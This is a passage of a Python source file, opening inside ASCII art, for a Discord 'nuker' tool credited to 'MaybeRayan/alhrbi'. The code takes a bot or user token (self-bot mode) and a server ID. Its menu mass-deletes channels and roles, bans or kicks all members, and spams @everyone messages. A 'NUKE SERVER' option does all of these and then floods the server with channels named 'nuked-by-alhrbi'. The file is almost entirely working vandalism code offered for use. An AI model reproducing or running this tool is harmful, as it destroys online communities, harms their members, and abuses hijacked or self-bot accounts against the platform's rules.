                    ⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⢈⠴⣫⢷⡹⡾⣽⣻⡵⣏⣎⠸⣘⡷⣯⣟⡾⡵⢎⣿⣽⣿⣯⣟⣿⣿⣿⣿⣿⣿⣿⠀⠠⢌⠃⢀⠎⣴⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⢢⡙⢦⣝⡾⣼⢯⣿⣱⣏⡳⣕⣣⠞⣥⢋⠲⠁⡱⢦⡜⢻⣿⣿⣿⡇⣻⣿⣿⣟⠦⣙⢧⢳⡠⣭⢱⣠⣻⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣏⣾⣿⣿⣿⣿⣿⠀
                    ⠀⢨⣽⣿⣿⣿⣿⣧⠀⠀⠂⡜⣱⢏⣷⡻⣷⣏⣿⡳⣌⠒⢬⣻⢷⣯⣟⣱⢫⣾⢿⣿⢷⡿⣿⣿⣿⣿⣿⣿⣷⠀⢣⢎⡳⢎⠀⠋⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⢨⠱⣜⢳⢮⡿⣽⣻⢾⣱⣎⢷⡱⢮⡝⣎⢇⢂⣴⣿⡌⢹⣿⣿⣿⣿⡇⣿⣿⣿⣿⡘⡱⢎⢣⠳⣘⢧⡷⣻⣭⢿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣷⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠐⣌⢳⢯⡾⣽⣳⣟⣾⡳⢥⠚⢬⣟⡿⣮⢿⡽⣯⢿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠡⣎⠵⡊⢀⢀⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⡈⢆⡳⡜⣯⢾⡽⣷⣻⢯⡷⣞⢧⡝⣶⡹⣜⠮⡄⢻⣿⣿⣿⣿⣿⣿⣿⢧⣿⣿⣿⡷⣱⡹⣌⣦⠽⣜⢾⡼⣽⢯⡿⣽⣿⣿⣿⣿⣿⣿⣿⢧⢻⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣿⣿⣿⣿⣿⣿⠄⠀⠂⠤⣫⢟⡞⠷⢻⣞⣷⣛⠦⣉⠲⣌⢳⡙⢮⡹⣭⢻⢾⣝⡳⣯⣿⣿⣿⣿⣿⣿⡿⠀⡑⢎⡳⢩⠄⢸⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠐⡌⢲⡱⣝⢮⡿⣽⣻⣯⢿⣽⡻⣮⡝⣶⡹⢎⡳⣅⠸⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡟⣴⣻⣿⣾⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣻⣿⣿⣿⣿⣿⠀
                    ⠀⠸⠿⠿⡿⠿⠿⠛⠀⠀⠀⠄⠁⠈⠀⢀⣠⣟⡾⣝⡲⢄⠳⣬⢇⡏⣗⡳⣭⢻⡾⣭⢷⣿⣿⣿⣿⣿⣿⣿⡇⠀⢜⢪⡕⢣⠌⠀⢻⣿⡟⠉⠀⠀⠀⠠⠈⠀⠀⠀⠁⠈⠑⠃⠟⠾⣽⣻⡷⣿⢯⣷⣻⢧⣛⠶⢹⢧⡓⢮⡄⢹⣿⣿⣿⣿⢿⣿⢸⣿⣿⣿⡟⡴⣿⣿⣿⣿⣯⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⢼⣿⣿⣿⣿⣿⠀
                    ⠀⠀⠀⠀⣀⡀⣀⣀⠀⠀⠀⢀⠆⡀⠐⣯⢾⣽⢻⡝⠒⠌⣱⠳⣎⠽⣸⢱⣋⠷⣹⡝⣞⢯⣿⣿⣿⣿⣿⡟⠀⠀⢎⢲⣉⠖⠀⠀⠀⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢟⡾⣵⢻⡌⠃⣸⢲⡹⢦⡹⡀⢿⣿⣿⡇⡏⡿⣾⣿⣿⡿⡝⢼⣻⣯⣿⣷⣿⣟⣿⣟⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅⠸⢿⣿⣿⣿⣿⠀
                    ⠀⢰⠂⢸⣿⡯⣝⠯⠀⠀⠀⠠⣈⠀⢀⢾⡹⢎⡥⢌⣡⠠⣄⣫⢌⣣⢥⣣⣜⣣⢳⣜⣼⣪⣽⣿⣿⣿⡗⠀⠀⠘⣌⠲⣡⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠃⣠⡞⣷⣋⡗⣣⢇⠵⢸⣿⣿⣯⢁⢇⣿⣿⣯⢷⣜⣤⣏⢷⡹⣎⣳⡝⣾⣹⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⠂⢰⣿⣿⣿⣿⣿⠀
                    ⠀⠸⠁⠀⣿⣱⣼⣶⠀⠀⡀⠢⣕⠂⠈⣯⢟⣯⣞⠿⣞⣿⣳⢯⣿⡽⣯⣷⣻⣟⣯⣿⣷⣿⣿⣿⣿⡟⠀⠀⠀⢡⢢⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⢯⢼⡱⣊⠂⣼⢯⣿⢇⢎⣾⣿⣿⣿⣿⣿⣾⡿⣟⣿⣽⢷⣻⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⢸⣿⣿⣿⣿⣿⠀
                    ⠀⢸⠀⢘⣿⣿⢾⣿⠀⠐⠠⠐⢮⠀⠀⣻⡞⣷⡞⣿⡽⣾⡽⣯⢿⣽⣻⣽⣿⣿⣯⣿⣾⢿⣿⣿⡟⠀⠀⠀⠀⢂⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢖⡣⢁⣼⡟⣾⣿⢫⣾⣿⢿⣿⣿⡿⣿⣽⡿⣿⣟⡿⣟⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⠀
                    ⠀⢸⠀⠈⣿⡿⠛⠋⠀⠈⠄⠀⢯⠀⠀⣳⣟⣳⣟⣷⣻⢷⣻⣯⢿⣯⣿⢿⣯⣿⣟⣿⡿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⣿⣿⣹⣿⢏⣾⣿⣿⣿⣿⡿⣿⣿⣳⣿⣟⡿⣟⣿⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⡍⠒⡀⠌⢉⠀⠡⠁⠀
                    ⠀⠘⠁⠠⠀⠀⠀⠀⠀⠈⠆⢘⡸⠄⠀⣳⢯⣷⣻⢾⡽⣯⢷⣯⣿⣞⣿⣻⣷⢿⣞⣷⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠘⢿⢧⣿⠏⡎⣷⣿⡿⣿⣿⢿⣽⣷⡿⢿⣾⣻⣯⣟⣯⢷⢯⣟⣯⢿⡻⣝⢎⠧⣓⡱⢌⠡⠐⡈⠄⡈⠡⠀⠀
                    ⠀⠀⠀⢠⠁⠀⡀⠄⠀⠈⡄⢠⡙⠆⠀⢼⣛⡶⢯⣻⢽⣯⣟⣾⣳⣟⣯⣿⡽⣿⣽⣾⣿⡭⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣂⡀⠘⣿⠏⠀⡇⠉⠃⠉⠉⠉⠋⠉⠁⠁⠈⠁⠉⠈⠁⠈⠙⠾⡼⣘⠧⡓⡜⢬⠓⡥⢚⡄⢂⠡⠐⠠⢀⠡⠀⠀
                    ⠀⠀⠀⠀⠆⠁⠀⠀⠀⠀⠐⠠⡙⠆⠀⠺⣵⣫⢷⣫⣞⢷⣻⣞⡷⣯⣟⣾⡽⣟⣷⣻⡿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⢠⠀⠀⠀⢀⠀⠀⠀⠀⠀⢠⠁⢀⣻⣿⣿⠀⠉⠀⠀⡇⠶⠲⡔⢲⠳⡞⢖⡣⠄⠀⢶⣒⢶⡲⢤⢎⡳⢅⡣⢎⡱⢊⢥⢋⠴⢣⠘⠠⠐⡀⠡⠀⠄⠀⠀
                    ⠀⠀⠀⠀⠐⠈⡀⠐⠀⠀⠀⠀⠈⠀⠀⠀⢣⠟⣮⠳⡝⢯⡳⢏⡟⣳⠯⠿⣽⢻⢯⡟⡿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⠀⢀⣠⠴⠒⠒⠁⠀⠀⢀⠆⠀⠀⠀⠀⠀⠈⡒⣦⡈⣿⡃⠀⠀⠀⡨⡇⢢⠡⢄⡡⢊⠔⡡⢒⠀⠀⠮⡝⢮⡙⠧⣋⠜⢢⠑⡊⠴⠉⢆⠩⠒⠡⠉⠄⡁⠠⠐⠀⠈⠀⠀
                    ⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⢀⠈⡀⢀⠁⡀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣠⠤⠞⠁⢀⣤⠶⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠳⠝⠻⠚⡄⠀⣠⣼⣷⡇⠠⢈⠄⣀⠂⠄⠀⠀⠀⠀⠀⣀⠀⣀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢂⠐⠀⠀⠈⢀⠀⠀
"""

async def show_art(choice):
    if choice in ['1', '2', '3', '4', '5', '6']:
        print(YELLOW + "=" * 60)
        print(YELLOW + DRAGON)
        print(YELLOW + "=" * 60)
    elif choice in ['7', '8']:
        print(YELLOW + "=" * 60)
        print(YELLOW + FACE)
        print(YELLOW + "=" * 60)
    elif choice == '9':
        print(YELLOW + "=" * 60)
        print(YELLOW + BYE)
        print(YELLOW + "=" * 60)
    elif choice == 'alhrbi':
        print(YELLOW + "=" * 60)
        print(YELLOW + ALHRBI_ART)
        print(YELLOW + "=" * 60)

def print_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(YELLOW + "=" * 60)
    print(YELLOW + LOGO_MAIN)
    print(YELLOW + "=" * 60)
    print(YELLOW + "by : MaybeRayan")
    print(YELLOW + "Owner : mayberayanalhrbi")
    print(YELLOW + "=" * 60)

# ==================== FAST FUNCTIONS ====================
async def fast_delete_channel(channel):
    try:
        await channel.delete()
        return True
    except:
        return False

async def fast_delete_role(role):
    try:
        await role.delete()
        return True
    except:
        return False

async def fast_ban(member):
    try:
        await member.ban(reason="Tool", delete_message_days=0)
        return True
    except:
        return False

async def fast_kick(member):
    try:
        await member.kick(reason="Tool")
        return True
    except:
        return False

async def fast_create(guild, name):
    try:
        return await guild.create_text_channel(name=name)
    except:
        return None

async def fast_rename_channel(channel, name):
    try:
        await channel.edit(name=name)
        return True
    except:
        return False

async def fast_send(channel, msg):
    try:
        await channel.send(msg + " @everyone")
        return True
    except:
        return False

async def fast_send_no_mention(channel, msg):
    try:
        await channel.send(msg)
        return True
    except:
        return False

# ==================== FAST HANDLERS ====================
async def handle_delete_channels(guild):
    global cancel_flag
    reset_cancel()
    await show_art('1')
    
    channels = list(guild.channels)
    if not channels:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    
    printc(f"[+] Deleting {len(channels)} channels...")
    
    tasks = [fast_delete_channel(ch) for ch in channels]
    
    cancel_task = asyncio.create_task(wait_for_cancel())
    
    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
    
    cancel_task.cancel()
    reset_cancel()
    
    printc(f"[+] Deleted {len(done)} channels!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_delete_roles(guild):
    global cancel_flag
    reset_cancel()
    await show_art('2')
    
    roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
    if not roles:
        printc("[X] No roles found")
        inp("Press Enter...")
        return
    
    printc(f"[+] Deleting {len(roles)} roles...")
    
    tasks = [fast_delete_role(r) for r in roles]
    
    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
    
    printc(f"[+] Deleted {len(done)} roles!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_create_channels(guild):
    global cancel_flag
    reset_cancel()
    await show_art('3')
    
    count = inp("[?] How many? : ").strip()
    if not count.isdigit():
        return
    count = int(count)
    
    printc(f"[+] Creating {count} channels...")
    
    tasks = [fast_create(guild, random.choice(NAMES)) for _ in range(count)]
    
    cancel_task = asyncio.create_task(wait_for_cancel())
    
    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
    
    cancel_task.cancel()
    reset_cancel()
    
    printc(f"[+] Created {len(done)} channels!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_rename_channels(guild):
    global cancel_flag
    reset_cancel()
    await show_art('4')
    
    channels = list(guild.text_channels)
    if not channels:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    
    printc(f"[+] Renaming {len(channels)} channels...")
    
    tasks = [fast_rename_channel(ch, random.choice(NAMES)) for ch in channels]
    
    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
    
    printc(f"[+] Renamed {len(done)} channels!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_rename_custom(guild):
    global cancel_flag
    reset_cancel()
    await show_art('5')
    
    channels = list(guild.text_channels)
    if not channels:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    
    printc("[+] Enter names separated by dot (.)")
    printc("[+] Example: name1 . name2 . name3")
    print()
    names_in = inp("[?] Names: ").strip()
    if not names_in:
        return
    
    names = [n.strip() for n in names_in.split('.') if n.strip()]
    if not names:
        printc("[X] No valid names")
        inp("Press Enter...")
        return
    
    printc(f"[+] Renaming {len(channels)} channels...")
    
    tasks = [fast_rename_channel(ch, names[i % len(names)]) for i, ch in enumerate(channels)]
    
    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
    
    printc(f"[+] Renamed {len(done)} channels!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_send_all(guild):
    global cancel_flag
    reset_cancel()
    await show_art('6')
    
    channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
    if not channels:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    
    msg = inp("[?] Message: ").strip()
    if not msg:
        return
    
    count = inp("[?] Per channel: ").strip()
    if not count.isdigit():
        return
    count = int(count)
    
    printc(f"[+] Sending {count * len(channels)} messages...")
    
    tasks = []
    for ch in channels:
        for _ in range(count):
            tasks.append(fast_send(ch, msg))
    
    cancel_task = asyncio.create_task(wait_for_cancel())
    
    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
    
    cancel_task.cancel()
    reset_cancel()
    
    printc(f"[+] Sent {len(done)} messages!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_ban_all(guild):
    global cancel_flag
    reset_cancel()
    await show_art('7')
    
    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
    if not members:
        printc("[+] No members to ban")
        inp("Press Enter...")
        return
    
    printc(f"[+] Banning {len(members)} members...")
    
    tasks = [fast_ban(m) for m in members]
    
    cancel_task = asyncio.create_task(wait_for_cancel())
    
    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
    
    cancel_task.cancel()
    reset_cancel()
    
    printc(f"[+] Banned {len(done)} members!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_kick_all(guild):
    global cancel_flag
    reset_cancel()
    await show_art('8')
    
    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
    if not members:
        printc("[+] No members to kick")
        inp("Press Enter...")
        return
    
    printc(f"[+] Kicking {len(members)} members...")
    
    tasks = [fast_kick(m) for m in members]
    
    cancel_task = asyncio.create_task(wait_for_cancel())
    
    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
    
    cancel_task.cancel()
    reset_cancel()
    
    printc(f"[+] Kicked {len(done)} members!")
    printc("[+] Press Enter to return")
    inp("")

async def handle_nuke(guild):
    global cancel_flag
    reset_cancel()
    await show_art('9')
    
    confirm = inp("[!] Are you sure you want to NUKE this server? (y/n): ").strip().lower()
    if confirm != 'y':
        printc("[!] Nuke cancelled")
        inp("Press Enter...")
        return
    
    printc("[+] NUKE STARTED!")
    
    all_tasks = []
    
    all_tasks.extend([fast_delete_channel(ch) for ch in guild.channels])
    
    roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
    all_tasks.extend([fast_delete_role(r) for r in roles])
    
    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
    all_tasks.extend([fast_ban(m) for m in members])
    
    done, pending = await asyncio.wait(all_tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
    
    printc(f"[+] Nuke completed! {len(done)} actions done!")
    
    printc("[+] Creating new channels...")
    channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
    
    create_tasks = [fast_create(guild, random.choice(channel_names)) for _ in range(50)]
    done2, pending2 = await asyncio.wait(create_tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
    
    printc(f"[+] Created {len(done2)} new channels!")
    printc("[+] Server NUKED Successfully!")
    printc("[+] Press Enter to return")
    inp("")

# ==================== MENU ====================
async def main_menu(guild):
    while True:
        print_logo()
        print(YELLOW + f"Connected Server: {guild.name} (ID: {guild.id})")
        print(YELLOW + "=" * 60)
        print(YELLOW + "[1] Delete All Channels (FAST)")
        print(YELLOW + "[2] Delete All Roles (FAST)")
        print(YELLOW + "[3] Create Mass Channels (FAST)")
        print(YELLOW + "[4] Mass Rename Channels - Random (FAST)")
        print(YELLOW + "[5] Mass Rename Channels - Custom (FAST)")
        print(YELLOW + "[6] Mass Send Messages (FAST)")
        print(YELLOW + "[7] Ban All Members (FAST)")
        print(YELLOW + "[8] Kick All Members (FAST)")
        print(YELLOW + "[9] NUKE SERVER (FAST)")
        print(YELLOW + "[0] Exit")
        print(YELLOW + "=" * 60)

        choice = inp("[?] Choice: ").strip().lower()

        if choice == '1':
            await handle_delete_channels(guild)
        elif choice == '2':
            await handle_delete_roles(guild)
        elif choice == '3':
            await handle_create_channels(guild)
        elif choice == '4':
            await handle_rename_channels(guild)
        elif choice == '5':
            await handle_rename_custom(guild)
        elif choice == '6':
            await handle_send_all(guild)
        elif choice == '7':
            await handle_ban_all(guild)
        elif choice == '8':
            await handle_kick_all(guild)
        elif choice == '9':
            await handle_nuke(guild)
        elif choice == 'alhrbi':
            await show_art('alhrbi')
            inp("Press Enter...")
        elif choice == '0':
            printc("[+] Exiting...")
            await bot.close()
            sys.exit()

# ==================== STARTUP ====================
async def start():
    global bot
    while True:
        print_logo()
        token = inp("[+] Token: ").strip()
        if not token:
            continue
        
        try:
            gid = int(inp("[+] Guild ID: ").strip())
        except ValueError:
            printc("[X] Invalid Guild ID!")
            continue
        
        print()
        printc("1. Bot Token")
        printc("2. User Token (Self-Bot)")
        print()
        choice = inp("[?] Choose: ").strip()
        
        try:
            if choice == "2":
                bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
                
                @bot.event
                async def on_ready():
                    print_logo()
                    guild = bot.get_guild(gid)
                    if guild:
                        printc(f"[+] Connected: {guild.name}")
                        await main_menu(guild)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                
                try:
                    await bot.start(token, bot=False)
                    break
                except Exception as e:
                    printc(f"[X] Connection failed: {e}")
                    continue
            
            else:
                bot = commands.Bot(command_prefix="!", intents=intents)
                
                @bot.event
                async def on_ready():
                    print_logo()
                    guild = bot.get_guild(gid)
                    if guild:
                        printc(f"[+] Connected: {guild.name}")
                        await main_menu(guild)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                
                try:
                    await bot.start(token)
                    break
                except Exception as e:
                    printc(f"[X] Connection failed: {e}")
                    continue
        
        except Exception as e:
            printc(f"[X] Error: {e}")
            continue

if __name__ == "__main__":
    try:
        asyncio.run(start())
    except Exception as e:
        print(RED + f"[X] Error: {e}")
        input(YELLOW + "\n[!] Press Enter to exit...")
